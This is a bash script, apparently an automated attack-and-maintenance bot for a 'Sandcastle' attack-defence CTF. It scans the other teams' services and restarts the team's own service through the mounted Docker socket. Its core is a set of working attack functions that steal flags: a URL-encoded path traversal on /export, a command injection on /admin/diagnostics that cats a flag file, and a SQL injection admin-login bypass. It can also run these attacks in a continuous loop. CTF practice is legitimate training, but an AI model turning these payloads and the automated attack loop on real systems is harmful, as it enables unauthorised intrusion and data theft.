#!/usr/bin/env bash
# =============================================================================
# Sandcastle CTF Bot — shell attack & maintenance script
#
# Designed to run INSIDE a team's SSH container (team<N>-ssh).
# The team ID is auto-detected from the container hostname.
# Override with:  MY_TEAM=3 ./bot.sh attack
#
# Dependencies (all present in the SSH container image):
#   bash, curl, ping, docker CLI (Docker socket is mounted at /var/run/docker.sock)
#
# Usage:
#   ./bot.sh                       # interactive menu
#   ./bot.sh ping                  # ping sweep
#   ./bot.sh health                # health-check all services
#   ./bot.sh restart               # bring own vuln service up if down
#   ./bot.sh watchdog              # restart loop: monitor own service
#   ./bot.sh attack                # exploit all other teams
#   ./bot.sh attack-team 2         # exploit a specific team
#   ./bot.sh fake-flag 2           # probe team2 /internal/plant
#   ./bot.sh loop 60               # continuous attack every 60 s
#   ./bot.sh loop 60 watchdog      # loop + watchdog combined
#
# Deployed from the host via:
#   ./deploy.sh 2 3 4              # copy bot into team2/3/4 SSH containers
# =============================================================================
set -euo pipefail

# ─────────────────────────────── config ────────────────────────────────────

NUM_TEAMS=${NUM_TEAMS:-4}
SERVICE_PORT=${SERVICE_PORT:-8080}
FLAG_REGEX='FLAG\{[0-9a-f]{32}\}'

# Auto-detect own team ID from hostname (e.g. "team3-ssh" → 3).
# MY_TEAM env var overrides.
_detect_team() {
    if [[ -n "${MY_TEAM:-}" ]]; then
        echo "$MY_TEAM"
        return
    fi
    local h; h=$(hostname)
    local n; n=$(echo "$h" | grep -oE '[0-9]+' | head -1 || true)
    echo "${n:-0}"
}
MY_TEAM=$(_detect_team)

# ─────────────────────────────── colours ───────────────────────────────────

RED='\033[0;31m'; GREEN='\033[0;32m'
YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

log_ok()   { echo -e "${GREEN}[+]${NC} $*"; }
log_info() { echo -e "${CYAN}[*]${NC} $*"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $*"; }
log_err()  { echo -e "${RED}[-]${NC} $*" >&2; }

# ─────────────────────────────── service URL ───────────────────────────────

service_url() { echo "http://10.10.${1}.3:${SERVICE_PORT}"; }

# ─────────────────────────────── ping ──────────────────────────────────────

ping_team() {
    local ip="10.10.${1}.3"
    ping -c 1 -W 2 "$ip" &>/dev/null
}

ping_all() {
    log_info "Ping sweep — ${NUM_TEAMS} teams"
    for i in $(seq 1 "$NUM_TEAMS"); do
        local ip="10.10.${i}.3"
        if ping_team "$i"; then
            echo -e "  team${i}  ${ip}  ${GREEN}UP${NC}"
        else
            echo -e "  team${i}  ${ip}  ${RED}DOWN${NC}"
        fi
    done
}

# ─────────────────────────────── health check ──────────────────────────────

health_check() {
    local team_id=$1
    local url; url=$(service_url "$team_id")
    local body
    body=$(curl -sf --max-time 5 "${url}/health" 2>/dev/null || true)
    if echo "$body" | grep -q '"ok"'; then
        log_ok "team${team_id}  ${url}/health  — OK"
    else
        log_warn "team${team_id}  ${url}/health  — FAIL (body: ${body:0:60})"
    fi
}

health_all() {
    log_info "Health checks"
    for i in $(seq 1 "$NUM_TEAMS"); do
        health_check "$i" || true
    done
}

# ─────────────────────────────── own service management ───────────────────
# The Docker socket (/var/run/docker.sock) is mounted inside the SSH container,
# so we talk to Docker directly — no SSH or sshpass needed.

is_own_service_running() {
    local state
    state=$(docker inspect --format='{{.State.Running}}' "team${MY_TEAM}-vuln" 2>/dev/null || echo "false")
    [[ "$state" == "true" ]]
}

restart_own_service() {
    local service_dir="/home/team${MY_TEAM}/service"
    if [[ ! -d "$service_dir" ]]; then
        log_err "Service dir $service_dir not found"
        return 1
    fi
    log_info "Running docker compose up for team${MY_TEAM}-vuln …"
    docker compose -f "${service_dir}/sandcastle-compose.yml" up -d --build
    log_ok "Service (re)started"
}

check_and_start_service() {
    log_info "Checking team${MY_TEAM}-vuln …"
    if is_own_service_running; then
        log_ok "team${MY_TEAM}-vuln is already running"
    else
        log_warn "team${MY_TEAM}-vuln is DOWN — starting"
        restart_own_service
    fi
}

# Continuous watchdog: monitors and restarts own service
run_watchdog() {
    local interval=${1:-30}
    log_info "Watchdog for team${MY_TEAM}-vuln (every ${interval}s, Ctrl+C to stop)"
    while true; do
        check_and_start_service
        sleep "$interval"
    done
}

# ─────────────────────────────── curl attacks ──────────────────────────────

# Steal flag via path traversal (no auth required)
steal_path_traversal() {
    local team_id=$1
    local url; url=$(service_url "$team_id")
    local body
    body=$(curl -sf --max-time 6 \
        "${url}/export?file=..%2Fflag.txt" 2>/dev/null || true)
    echo "$body" | grep -oE "$FLAG_REGEX" | head -1
}

# Steal flag via command injection (no auth required)
steal_cmdi() {
    local team_id=$1
    local url; url=$(service_url "$team_id")
    local body
    body=$(curl -sf --max-time 6 \
        -X POST "${url}/admin/diagnostics" \
        --data-urlencode "host=127.0.0.1; cat /app/data/flag.txt" \
        2>/dev/null || true)
    echo "$body" | grep -oE "$FLAG_REGEX" | head -1
}

# Steal flag via SQL injection bypass → read /notes as admin
steal_sqli() {
    local team_id=$1
    local url; url=$(service_url "$team_id")
    local jar; jar=$(mktemp)

    # Login as admin via SQLi
    curl -sf --max-time 6 \
        -c "$jar" -b "$jar" \
        -X POST "${url}/login" \
        -d "username=admin' --&password=x" \
        -L -o /dev/null 2>/dev/null || true

    local body
    body=$(curl -sf --max-time 6 \
        -b "$jar" "${url}/notes" 2>/dev/null || true)
    rm -f "$jar"
    echo "$body" | grep -oE "$FLAG_REGEX" | head -1
}

# Probe /internal/plant with a fake flag (wrong token → 403 expected)
probe_plant_endpoint() {
    local team_id=$1
    local url; url=$(service_url "$team_id")
    # generate a random 32-char hex string without /dev/urandom dep on all systems
    local fake_flag="FLAG{$(cat /proc/sys/kernel/random/uuid 2>/dev/null \
                    | tr -d '-' | head -c 32 \
                    || openssl rand -hex 16)}"
    log_info "Probing team${team_id} /internal/plant with fake flag: ${fake_flag}"
    local code
    code=$(curl -sf --max-time 6 -o /dev/null -w "%{http_code}" \
        -X POST "${url}/internal/plant" \
        -H "Content-Type: application/json" \
        -H "X-Plant-Token: wrongtoken" \
        -d "{\"flag\": \"${fake_flag}\"}" 2>/dev/null || echo "000")
    case "$code" in
        200) log_ok   "team${team_id} /internal/plant → 200 (accepted!?)" ;;
        403) log_info "team${team_id} /internal/plant → 403 (endpoint alive, bad token)" ;;
        000) log_warn "team${team_id} /internal/plant → unreachable" ;;
        *)   log_warn "team${team_id} /internal/plant → HTTP ${code}" ;;
    esac
}

# Full attack on one team
attack_team() {
    local team_id=$1
    [[ "$team_id" -eq "$MY_TEAM" ]] && return

    echo ""
    log_info "── Attacking team${team_id} ($(service_url "$team_id")) ──"

    if ! ping_team "$team_id"; then
        log_warn "team${team_id} — no ping, skipping"
        return
    fi

    local flag=""

    # Try path traversal first (fastest)
    flag=$(steal_path_traversal "$team_id")
    if [[ -n "$flag" ]]; then
        log_ok "[path_traversal] FLAG: ${flag}"
        return
    else
        log_warn "[path_traversal] no flag"
    fi

    # Try command injection
    flag=$(steal_cmdi "$team_id")
    if [[ -n "$flag" ]]; then
        log_ok "[cmdi] FLAG: ${flag}"
        return
    else
        log_warn "[cmdi] no flag"
    fi

    # Try SQL injection
    flag=$(steal_sqli "$team_id")
    if [[ -n "$flag" ]]; then
        log_ok "[sqli] FLAG: ${flag}"
    else
        log_warn "[sqli] no flag — team${team_id} may have patched"
    fi
}

attack_all() {
    log_info "Attacking all teams (MY_TEAM=${MY_TEAM})"
    for i in $(seq 1 "$NUM_TEAMS"); do
        attack_team "$i" || true
    done
}

# Continuous attack loop (optionally with watchdog)
loop_attack() {
    local interval=${1:-60}
    local do_watchdog=${2:-}
    log_info "Continuous attack loop — interval: ${interval}s  (Ctrl+C to stop)"
    while true; do
        [[ -n "$do_watchdog" ]] && check_and_start_service
        attack_all
        echo ""
        log_info "Sleeping ${interval}s …"
        sleep "$interval"
    done
}

# ─────────────────────────────── interactive menu ──────────────────────────

show_menu() {
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║  Sandcastle CTF Bot  (team${MY_TEAM})       ║${NC}"
    echo -e "${CYAN}╠══════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${NC}  1) Ping all teams                   ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  2) Health-check all services        ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  3) Check & restart own service      ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  4) Watchdog (monitor own service)   ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  5) Attack all other teams           ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  6) Attack specific team             ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  7) Probe /internal/plant (fake flag)${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  8) Continuous attack loop           ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  9) Loop + watchdog combined         ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  0) Exit                             ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════╝${NC}"
    echo -n "Choice: "
}

run_menu() {
    log_info "Running as team${MY_TEAM} (hostname: $(hostname))"
    while true; do
        show_menu
        local choice
        read -r choice
        case "$choice" in
            1) ping_all ;;
            2) health_all ;;
            3) check_and_start_service ;;
            4)
                echo -n "Check interval (seconds) [30]: "
                read -r intv
                run_watchdog "${intv:-30}"
                ;;
            5) attack_all ;;
            6)
                echo -n "Target team ID: "
                read -r tid
                attack_team "$tid"
                ;;
            7)
                echo -n "Target team ID: "
                read -r tid
                probe_plant_endpoint "$tid"
                ;;
            8)
                echo -n "Attack interval (seconds) [60]: "
                read -r intv
                loop_attack "${intv:-60}"
                ;;
            9)
                echo -n "Interval (seconds) [60]: "
                read -r intv
                loop_attack "${intv:-60}" "watchdog"
                ;;
            0) exit 0 ;;
            *) log_err "Invalid choice" ;;
        esac
    done
}

# ─────────────────────────────── entry point ───────────────────────────────

main() {
    local cmd=${1:-menu}
    log_info "Running as team${MY_TEAM} (hostname: $(hostname))"
    case "$cmd" in
        ping)        ping_all ;;
        health)      health_all ;;
        restart)     check_and_start_service ;;
        watchdog)    run_watchdog "${2:-30}" ;;
        attack)      attack_all ;;
        attack-team) attack_team "${2:?Usage: bot.sh attack-team <N>}" ;;
        fake-flag)   probe_plant_endpoint "${2:?Usage: bot.sh fake-flag <N>}" ;;
        loop)        loop_attack "${2:-60}" ;;
        loop-watch)  loop_attack "${2:-60}" "watchdog" ;;
        menu)        run_menu ;;
        *)
            echo "Usage: $0 {ping|health|restart|watchdog [SEC]|attack|attack-team N|fake-flag N|loop [SEC]|loop-watch [SEC]|menu}"
            exit 1
            ;;
    esac
}

main "$@"
